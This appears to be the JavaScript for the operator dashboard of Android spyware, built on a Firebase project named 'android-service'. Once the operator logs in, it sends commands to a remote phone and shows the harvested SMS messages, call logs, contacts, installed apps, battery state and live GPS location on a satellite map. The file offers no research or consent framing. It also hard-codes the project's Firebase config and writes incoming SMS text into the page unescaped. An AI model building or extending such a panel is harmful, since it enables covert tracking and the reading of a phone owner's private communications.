// ✅ Firebase SDK Import
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import {
  getDatabase,
  ref,
  set,
  onValue,
  onChildAdded,
  get
} from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
import {
  getAuth,
  signOut,
  onAuthStateChanged
} from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";

// ✅ Firebase Config
const firebaseConfig = {
  apiKey: "AIzaSyCW87BPPsuA_AsNCzqfEEVFSvHF-SP100k",
  authDomain: "android-service-54676.firebaseapp.com",
  databaseURL: "https://android-service-54676-default-rtdb.firebaseio.com",
  projectId: "android-service-54676",
  storageBucket: "android-service-54676.appspot.com",
  messagingSenderId: "446333235153",
  appId: "1:446333235153:web:f7366fd64166b83d5b3af0"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const auth = getAuth();

let uid = null;
let dashboardInitialized = false;

// ✅ Global sendCommand function
function sendCommand(section, commandValue) {
  const user = auth.currentUser;
  if (!user) return console.warn("User not authenticated");
  const commandRef = ref(db, `users/${user.uid}/${section}/command`);
  set(commandRef, {
    value: commandValue,
    timestamp: new Date().toISOString()
  }).then(() => console.log(`✅ Sent '${commandValue}' to ${section}`))
    .catch(err => console.error("❌ Command Error:", err));
}

// ✅ Auth State Listener
onAuthStateChanged(auth, (user) => {
  if (user && !dashboardInitialized) {
    uid = user.uid;
    dashboardInitialized = true;
    initializeDashboard();
  } else if (!user) {
    window.location.href = "index.html";
  }
});

function initializeDashboard() {
  document.getElementById("logoutBtn")?.addEventListener("click", () => {
    signOut(auth).then(() => window.location.href = "index.html");
 
  });

     // Initial commands after user is authenticated
sendCommand("status", "getStatus");
sendCommand("battery", "getBattery");
sendCommand("lastSeen", "getLastSeen");
sendCommand("location", "getLocation");
sendCommand("installedApps", "getInstalledApps");
sendCommand("calls", "getCallLogs");
sendCommand("contacts", "getContacts");
sendCommand("sms", "getSmsLogs");


  // Real-time data listener
  const userRef = ref(db, `users/${uid}`);
  onValue(userRef, (snapshot) => {
    const data = snapshot.val();
    if (!data) return;

    document.getElementById("deviceStatus").textContent = data.status ? "Online" : "Offline";
    document.getElementById("deviceStatus").className = data.status === "online" ? "status-green" : "status-red";

    const battery = data.battery?.percentage;
    document.getElementById("batteryLevel").textContent = battery !== undefined ? `${battery}%` : "--%";
    
    const chargingOn = data.battery.charging  === true;
    console.log("Battery charging:", data.battery.charging);
    
    if (chargingOn) {
     document.querySelector(".chargingOn").style.display = "inline";
    } else {
     document.querySelector(".chargingOn").style.display = "none";
   }

    if (data.lastSeenTime) {
      const dt = new Date(data.lastSeenTime);
      document.getElementById("lastSeen").textContent = `At ${dt.toLocaleTimeString()} , On ${dt.toDateString()}`;
    } else {
      document.getElementById("lastSeen").textContent = "Unknown";
    }

    if (data.location?.latitude && data.location?.longitude) {
      const { latitude, longitude } = data.location;
      liveMarker.setLatLng([latitude, longitude]);
      map.setView([latitude, longitude], 16);
      getAddressFromCoords(latitude, longitude);
    }
  });

  const map = L.map('map', { zoomControl: true }).setView([21.4505, 80.2048], 14);
  const liveMarker = L.marker([21.4505, 80.2048]).addTo(map);

  L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
    attribution: '&copy; Esri — Source: Esri, Maxar',
    maxZoom: 19
  }).addTo(map);

  function getAddressFromCoords(lat, lng) {
    fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`)
      .then(res => res.json())
      .then(data => {
        const name = data.display_name || "Unknown";
        liveMarker.bindPopup(`<b>Location:</b><br>${name}`).openPopup();
        document.getElementById("locationInfo").textContent = name;
      })
      .catch(() => {
        liveMarker.bindPopup("Location details not available").openPopup();
      });
  }

  document.querySelectorAll("#trackLocation").forEach(btn => {
    btn.addEventListener("click", () => {
      document.querySelector("#status").style.display = "flex";
      displayNoneDashboard();
      sendCommand('location', 'getLocation');
      setTimeout(() => map.invalidateSize(), 300);
    });
  });

  document.querySelectorAll(".crossLocation").forEach(btn => {
    btn.addEventListener("click", () => {
      ["smsLogs", "status", "installedApps", "callLogs", "contactLogs"].forEach(id => {
        document.getElementById(id).style.display = "none";
      });
      displayBlockDashboard();
    });
  });

  const fetchData = (path, tbodyId, mapFn) => {
    const refPath = ref(db, `users/${uid}/${path}`);
    const tbody = document.getElementById(tbodyId);
    tbody.innerHTML = "";
    get(refPath).then(snapshot => {
      if (!snapshot.exists()) return;
      snapshot.forEach(snap => tbody.innerHTML += mapFn(snap.val()));
      showSection(path);
    });
  };

  document.getElementById("btnInstalledApps")?.addEventListener("click", () => {
    fetchData("installedApps", "appsTableBody", app => `<tr><td>${app.name}</td><td>${app.package}</td></tr>`);
    sendCommand("installedApps", "getInstalledApps");
  });

  document.getElementById("btnCallLogs")?.addEventListener("click", () => {
    fetchData("calls", "callTableBody", log => {
      const time = log.time ? new Date(log.time).toLocaleString() : "N/A";
      return `<tr><td>${log.name || "-"}</td><td>${log.number || "-"}</td><td>${log.type || "-"}</td><td>${log.duration || "-"}s</td><td>${time}</td></tr>`;
    });
    sendCommand("calls", "getCallLogs");
  });

  document.getElementById("btnContacts")?.addEventListener("click", () => {
    fetchData("contacts", "contactTableBody", c => `<tr><td>${c.name || "-"}</td><td>${c.number || "-"}</td></tr>`);
    sendCommand("contacts", "getContacts");
  });

  document.getElementById("smsBtn")?.addEventListener("click", () => {
    document.getElementById("smsLogs").style.display = "block";
    displayNoneDashboard();
    sendCommand("sms", "getSmsLogs");
  });

  onChildAdded(ref(db, `users/${uid}/sms`), (smsSnap) => {
    const sms = smsSnap.val();
    const tbody = document.getElementById("smsTableBody");
    const tr = document.createElement("tr");
    tr.innerHTML = `<td>${sms.from || "Unknown"}</td><td>${sms.message || ""}</td><td>${new Date(sms.timestamp || Date.now()).toLocaleString()}</td>`;
    tbody.appendChild(tr);
  });

  document.getElementById("refreshSiteBtn")?.addEventListener("click", () => location.reload());
}

function displayNoneDashboard() {
  document.getElementById("dashboardMain").style.display = "none";
}

function displayBlockDashboard() {
  document.getElementById("dashboardMain").style.display = "block";
}
